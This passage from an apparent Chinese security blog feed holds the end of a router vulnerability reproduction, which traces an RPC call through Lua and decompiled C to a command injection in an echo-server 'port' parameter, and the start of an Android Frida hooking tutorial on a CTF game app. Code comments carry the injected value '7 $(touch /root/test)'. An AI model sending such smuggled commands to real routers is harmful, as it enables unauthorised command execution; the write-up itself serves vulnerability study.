class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">local function rpc_method_call(id, params)</span><br><span class="line">    if #params &lt; 3 then  ---params 至少三个参数</span><br><span class="line">        local resp = rpc.error_res  ponse(id, rpc.ERROR_CODE_INVALID_PARAMS)</span><br><span class="line">        ngx.say(cjson.encode(resp))</span><br><span class="line">        return</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    local sid, object, method, args = params[1], params[2], params[3], params[4] -- &quot;&quot; &quot;s2s&quot; &quot;enable_echo_server&quot; &quot;&#123;&quot;port&quot;: &quot;7 $(touch /root/test)&quot;&#125;&quot;</span><br><span class="line"></span><br><span class="line">    if type(sid) ~= &quot;string&quot; or type(object) ~= &quot;string&quot; or type(method) ~= &quot;string&quot; then</span><br><span class="line">        local resp = rpc.error_response(id, rpc.ERROR_CODE_INVALID_PARAMS)</span><br><span class="line">        ngx.say(cjson.encode(resp))</span><br><span class="line">        return  </span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    if args and type(args) ~= &quot;table&quot; then   ---- 上述为一些参数类型的验证</span><br><span class="line">        local resp = rpc.error_response(id, rpc.ERROR_CODE_INVALID_PARAMS)</span><br><span class="line">        ngx.say(cjson.encode(resp))</span><br><span class="line">        return</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    ngx.ctx.sid = sid</span><br><span class="line"></span><br><span class="line">    if not rpc.is_no_auth(object, method) then</span><br><span class="line">        if not rpc.access(&quot;rpc&quot;, object .. &quot;.&quot; .. method) then   --- 通过本地调用是不需要进行身份验证的</span><br><span class="line">            local resp = rpc.error_response(id, rpc.ERROR_CODE_ACCESS)</span><br><span class="line">            ngx.say(cjson.encode(resp))</span><br><span class="line">            return</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    local res = rpc.call(object, method, args) --- 调用rpc.lua 下的 call 并传入参数</span><br><span class="line">    if type(res) == &quot;number&quot; then</span><br><span class="line">        local resp = rpc.error_response(id, res)</span><br><span class="line">        ngx.say(cjson.encode(resp))</span><br><span class="line">        return</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    if type(res) ~= &quot;table&quot; then res = &#123;&#125; end</span><br><span class="line"></span><br><span class="line">    local resp = rpc.result_response(id, res)</span><br><span class="line">    ngx.say(cjson.encode(resp))</span><br><span class="line">end</span><br><span class="line">M.call = function(object, method, args)  -- s2s enable_echo_server &#123;&quot;port&quot;: &quot;7 $(touch /root/test)&quot;&#125;</span><br><span class="line">    ngx.log(ngx.DEBUG, &quot;call: &#x27;&quot;, object, &quot;.&quot;, method, &quot;&#x27;&quot;)</span><br><span class="line"></span><br><span class="line">    if not objects[object] then</span><br><span class="line">        local script = &quot;/usr/lib/oui-httpd/rpc/&quot; .. object</span><br><span class="line">        if not fs.access(script) then   --- 调用 fs 的 access函数，即判断是否存在该 脚本</span><br><span class="line">            return glc_call(object, method, args)</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        local ok, tb = pcall(dofile, script)  -- 使用 pcall 安全执行 dofile 加载脚本 ，tb是函数表</span><br><span class="line">        if not ok then               --- 因为 s2s.so 是二进制脚本 无法正常pcall加载 调用glc_call</span><br><span class="line">            ngx.log(ngx.ERR, tb)</span><br><span class="line">            return glc_call(object, method, args)</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        if type(tb) == &quot;table&quot; then</span><br><span class="line">            local funs = &#123;&#125;</span><br><span class="line">            for k, v in pairs(tb) do</span><br><span class="line">                if type(v) == &quot;function&quot; then</span><br><span class="line">                    funs[k] = v</span><br><span class="line">                end</span><br><span class="line">            end</span><br><span class="line">            objects[object] = funs</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    local fn = objects[object] and objects[object][method]   --- 无法调用 </span><br><span class="line">    if not fn  then</span><br><span class="line">        return glc_call(object, method, args)      ---使用glc_call 参数s2s enable_echo_server &#123;....&#125;</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    return fn(args)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>调用glc_call：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">local function glc_call(object, method, args)   --- s2s enable_echo_server &#123;....&#125;</span><br><span class="line">    ngx.log(ngx.DEBUG, &quot;call C: &#x27;&quot;, object, &quot;.&quot;, method, &quot;&#x27;&quot;)</span><br><span class="line"></span><br><span class="line">    local res = ngx.location.capture(&quot;/cgi-bin/glc&quot;, &#123;   ---- 发起一个内部请求到 /cgi-bin/glc POST请求 参数如下（这是Openresty平台的lua用法）</span><br><span class="line">        method = ngx.HTTP_POST,</span><br><span class="line">        body = cjson.encode(&#123;</span><br><span class="line">            object = object,</span><br><span class="line">            method = method,</span><br><span class="line">            args = args or &#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    if res.status ~= ngx.HTTP_OK then return M.ERROR_CODE_INTERNAL_ERROR end</span><br><span class="line"></span><br><span class="line">    local body = res.body</span><br><span class="line">    local code = tonumber(body:match(&quot;(-?%d+)&quot;))</span><br><span class="line"></span><br><span class="line">    if code ~= M.ERROR_CODE_NONE then</span><br><span class="line">        local err_msg = body:match(&quot;%d+ (.+)&quot;)</span><br><span class="line">        if err_msg then</span><br><span class="line">            ngx.log(ngx.ERR, err_msg)</span><br><span class="line">        end</span><br><span class="line">        return code</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    local msg = body:match(&quot;%d+ (.*)&quot;)</span><br><span class="line"></span><br><span class="line">    return cjson.decode(msg)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><strong>&#x2F;cgi-bin&#x2F;glc：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">  snprintf(rpc_lib_path, 0x80u, &quot;%s/%s.so&quot;, &quot;/usr/lib/oui-httpd/rpc&quot;, v30);//v30由params[1]传入,为s2s</span><br><span class="line">  dl_handle = dlopen(rpc_lib_path, 2);          // 动态加载共享库</span><br><span class="line">  dl_handle_copy = dl_handle;</span><br><span class="line">  if ( !dl_handle )</span><br><span class="line">  &#123;</span><br><span class="line">    dl_error_msg = dlerror();</span><br><span class="line">    printf(&quot;%d dlopen: %s&quot;, -32601, dl_error_msg);</span><br><span class="line">    goto LABEL_37;</span><br><span class="line">  &#125;</span><br><span class="line">  json_rpc_function = (int (__fastcall *)(int, int))dlsym(dl_handle, name);  //加载符号 name由params[2]传入</span><br><span class="line">  if ( json_rpc_function )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( argc &gt; 3 )</span><br><span class="line">      json_params = json_loads((int)argv[3], 0, 0);    // json_params</span><br><span class="line">    if ( !json_params )</span><br><span class="line">      json_params = ::json_object();</span><br><span class="line">    json_object_new = ::json_object();</span><br><span class="line">    json_response_object = json_object_new;</span><br><span class="line">    if ( logging_enabled )</span><br><span class="line">    &#123;</span><br><span class="line">      __gl_log(69505, 116, 0, &quot;glc call meth %s/%s\n&quot;, v30, name);</span><br><span class="line">      json_rpc_return = json_rpc_function(json_params, json_response_object);   // 以json_params为参数调用json_rpc_function，即上述params[1]的params[2]函数</span><br><span class="line">      __gl_log(69505, 118, 0, &quot;glc call end,ret = %d\n&quot;, json_rpc_return);</span><br><span class="line">      printf(&quot;%d&quot;, json_rpc_return);</span><br><span class="line">      if ( json_rpc_return )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_30:</span><br><span class="line">        sub_10990(json_params);</span><br><span class="line">        sub_10990(json_response_object);</span><br><span class="line">        goto LABEL_41;</span><br><span class="line">      &#125;</span><br><span class="line">      json_response_str = (const char *)json_dumps(json_response_object, 0);</span><br><span class="line">      __gl_log(69505, 121, 0, &quot;glc call result %s\n&quot;, json_response_str);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      json_rpc_call = json_rpc_function(json_params, json_object_new);</span><br><span class="line">      printf(&quot;%d&quot;, json_rpc_call);</span><br><span class="line">      if ( json_rpc_call )</span><br><span class="line">        goto LABEL_30;</span><br><span class="line">    &#125;</span><br><span class="line">    final_response_str = (const char *)json_dumps(json_response_object, 0);</span><br><span class="line">    printf(&quot; %s&quot;, final_response_str);</span><br><span class="line">    goto LABEL_30;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以得到调用的是s2s.so文件的enable_echo_server函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">backupValue = *(_DWORD *)off_16FC0;</span><br><span class="line">memset(commandBuffer, 0, sizeof(commandBuffer));</span><br><span class="line">portObject = json_object_get(jsonInput, &quot;port&quot;);   ///从参数中获取port键值对</span><br><span class="line">portString = (const char *)json_string_value(portObject);   //获取键值</span><br><span class="line">if ( *portString )</span><br><span class="line">&#123;</span><br><span class="line">  portValue = portString;</span><br><span class="line">  if ( atoi(portString) &gt; 0 &amp;&amp; atoi(portValue) &lt;= 65534 )  /// 只比较了大小，没有检查类型</span><br><span class="line">  &#123;</span><br><span class="line">    if ( check_file_is_exist(&quot;/usr/bin/echo_server&quot;) )</span><br><span class="line">    &#123;</span><br><span class="line">      formatCommand = (void (*)(_BYTE *, int, const char *, ...))snprintf_0;</span><br><span class="line">      snprintf_0(commandBuffer, 128, &quot;kill -9 $(pgrep -f \&quot;%s\&quot;)&quot;, &quot;/usr/bin/echo_server&quot;);</span><br><span class="line">      executeCommand = (int (__fastcall *)(_BYTE *))system_0;</span><br><span class="line">      system_0(commandBuffer);</span><br><span class="line">      formatCommand(commandBuffer, 128, &quot;%s -p %s -f&quot;, &quot;/usr/bin/echo_server&quot;, portValue);//命令执行</span><br><span class="line">      commandOutput = executeCommand(commandBuffer);</span><br></pre></td></tr></table></figure><p>可以看到这个命令注入显然是执行本地注入的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一些路由器漏洞复现&quot;&gt;&lt;a href=&quot;#一些路由器漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;一些路由器漏洞复现&quot;&gt;&lt;/a&gt;一些路由器漏洞复现&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>android之hook入门</title>
    <link href="http://s1nec-1o.github.io/2025/03/28/android%E4%B9%8Bhook%E5%85%A5%E9%97%A8/"/>
    <id>http://s1nec-1o.github.io/2025/03/28/android%E4%B9%8Bhook%E5%85%A5%E9%97%A8/</id>
    <published>2025-03-28T12:10:45.000Z</published>
    <updated>2025-03-28T12:34:03.601Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Android运行机制"><a href="#Android运行机制" class="headerlink" title="Android运行机制"></a>Android运行机制</h2><p>一般而言，在启动一个 App 时，Android 会首先执行 Application 类（AndroidManifest.xml 文件中注明）的创建工作，然后再开始执行 Main Activity，继而根据各种各样的逻辑执行相关代码。</p><h2 id="Android-逆向"><a href="#Android-逆向" class="headerlink" title="Android 逆向"></a>Android 逆向</h2><ul><li>分析方法，可以采用以下方式<ul><li>静态分析，对源代码进行逆向，然后阅读分析</li><li>动态分析，对代码进行动态调试，一般来说动态分析离不开静态分析。</li></ul></li><li>分析对象，一般有以下两类对象<ul><li>java层代码</li><li>原生层代码</li></ul></li></ul><p>Android 逆向主要应用于以下几个方向</p><ol><li>app 安全审查</li><li>系统漏洞挖掘</li><li>恶意代码杀查</li><li>同行业产品技术原理分析</li><li>移除安全机制</li></ol><p><strong>AndroidManifest.xml 文件</strong></p><ul><li>软件包名</li><li>apk 主活动，隐藏程序没有主 Activity</li></ul><p><strong>Application 在 java 层启动最早</strong></p><h3 id="逆向技巧"><a href="#逆向技巧" class="headerlink" title="逆向技巧"></a>逆向技巧</h3><p><strong>字符串定位：</strong></p><ul><li>程序报错信息</li><li>服务</li><li>广播</li></ul><p><strong>敏感API定位：</strong></p><ul><li>控件的事件函数<ul><li>onclick</li><li>show</li><li>Toast</li></ul></li><li>网络函数<ul><li>HttpGet</li><li>HttpPost</li><li>HttpUriRequest</li><li>socket</li></ul></li><li>发送短信</li><li>打电话</li><li>定位</li><li>等等</li></ul><p><strong>log信息：</strong></p><ul><li>利用程序本身产生的 log 信息</li><li>自己对代码反编译，插入 log 信息，并重打包来进行分析。</li></ul><p><strong>栈跟踪：</strong></p><p>我们可以用 ddms 提供的方法调用链的信息来判断程序目前的调用关系如何。</p><p><strong>钩子：</strong> </p><ul><li>xposed</li><li>cydia</li></ul><p><strong>monitor：</strong></p><ul><li>运行 log，程序运行产生的，系统运行产生的</li><li>线程跟踪</li><li>方法调用链</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>mumu模拟器、adb、jadx和frida</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">win</span></span><br><span class="line">adb connect 127.0.0.1:16384  # mumu-&gt;问题诊断 adb调试端口16384</span><br><span class="line">adb devices                       #显示已连接设备</span><br><span class="line">adb shell getprop ro.product.cpu.abi #查看系统型号</span><br><span class="line">adb push frida-server-16.6.6-android-x86_64 /data/local/tmp #将frida-server push进模拟器</span><br><span class="line">adb root #root</span><br><span class="line">adb shell #root进shell</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">shell</span></span><br><span class="line">cd /data/local/tmp</span><br><span class="line">chmod 755 frida-server-16.6.6-android-x86_64</span><br><span class="line">./frida-server-16.6.6-android-x86_64</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">win</span></span><br><span class="line">frida-ps -U #通过USB连接查看进程情况</span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">frida-ps -R #通过远程连接查看进程情况</span><br></pre></td></tr></table></figure><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><a href="https://blog.potatowo.top/2025/02/12/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-Frida/game.apk">链接</a></p><p><code>frida-ps -U</code>找到进程号</p><p><code>frida -U -p 3897</code></p><p>一个简单的石头剪刀布的游戏</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">package com.example.seccon2015.rock_paper_scissors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Handler;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> extends Activity implements View.OnClickListener &#123;</span><br><span class="line">    Button P;</span><br><span class="line">    Button S;</span><br><span class="line">    <span class="type">int</span> flag;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    Button r;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Handler handler = <span class="keyword">new</span> <span class="built_in">Handler</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Runnable showMessageTask = <span class="keyword">new</span> <span class="built_in">Runnable</span>() &#123; <span class="comment">// from class: com.example.seccon2015.rock_paper_scissors.MainActivity.1</span></span><br><span class="line">        @Override <span class="comment">// java.lang.Runnable</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">run</span>() &#123;</span><br><span class="line">            TextView tv3 = (TextView) MainActivity.<span class="keyword">this</span>.<span class="built_in">findViewById</span>(R.id.textView3);</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.n - MainActivity.<span class="keyword">this</span>.m == <span class="number">1</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;WIN! +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m - MainActivity.<span class="keyword">this</span>.n == <span class="number">1</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m == MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;DRAW +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m &lt; MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;WIN! +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt) &#123;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;SECCON&#123;&quot;</span> + String.<span class="built_in">valueOf</span>((MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.<span class="built_in">calc</span>()) * <span class="number">107</span>) + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> native <span class="type">int</span> <span class="title">calc</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> &#123;</span><br><span class="line">        System.<span class="built_in">loadLibrary</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        super.<span class="built_in">onCreate</span>(savedInstanceState);</span><br><span class="line">        <span class="built_in">setContentView</span>(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">this</span>.P = (Button) <span class="built_in">findViewById</span>(R.id.button);</span><br><span class="line">        <span class="keyword">this</span>.S = (Button) <span class="built_in">findViewById</span>(R.id.button3);</span><br><span class="line">        <span class="keyword">this</span>.r = (Button) <span class="built_in">findViewById</span>(R.id.buttonR);</span><br><span class="line">        <span class="keyword">this</span>.P.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.r.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.S.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.flag != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.flag = <span class="number">1</span>;</span><br><span class="line">            TextView tv3 = (TextView) <span class="built_in">findViewById</span>(R.id.textView3);</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            TextView tv = (TextView) <span class="built_in">findViewById</span>(R.id.textView);</span><br><span class="line">            TextView tv2 = (TextView) <span class="built_in">findViewById</span>(R.id.textView2);</span><br><span class="line">            <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">            Random rm = <span class="keyword">new</span> <span class="built_in">Random</span>();</span><br><span class="line">            <span class="keyword">this</span>.n = rm.<span class="built_in">nextInt</span>(<span class="number">3</span>);</span><br><span class="line">            String[] ss = &#123;<span class="string">&quot;CPU: Paper&quot;</span>, <span class="string">&quot;CPU: Rock&quot;</span>, <span class="string">&quot;CPU: Scissors&quot;</span>&#125;;</span><br><span class="line">            tv2.<span class="built_in">setText</span>(ss[<span class="keyword">this</span>.n]);</span><br><span class="line">            <span class="keyword">if</span> (v == <span class="keyword">this</span>.P) &#123;</span><br><span class="line">                tv.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Paper&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (v == <span class="keyword">this</span>.r) &#123;</span><br><span class="line">                tv.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Rock&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (v == <span class="keyword">this</span>.S) &#123;</span><br><span class="line">                tv.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Scissors&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.handler.<span class="built_in">postDelayed</span>(<span class="keyword">this</span>.showMessageTask, <span class="number">1000L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Android 会首先执行 Application 类，但是开发者一般是不需要去处理它的，对于Activity来说，标准的生命周期入口点是：**<code>onCreate()</code> 方法**，我们就可以通过重写来调用我们的第一个方法</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Override <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    super.<span class="built_in">onCreate</span>(savedInstanceState);</span><br><span class="line">    <span class="built_in">setContentView</span>(R.layout.activity_main);</span><br><span class="line">    <span class="keyword">this</span>.P = (Button) <span class="built_in">findViewById</span>(R.id.button);</span><br><span class="line">    <span class="keyword">this</span>.S = (Button) <span class="built_in">findViewById</span>(R.id.button3);</span><br><span class="line">    <span class="keyword">this</span>.r = (Button) <span class="built_in">findViewById</span>(R.id.buttonR);</span><br><span class="line">    <span class="keyword">this</span>.P.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.r.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.S.<span class="built_in">setOnClickListener</span>(<span 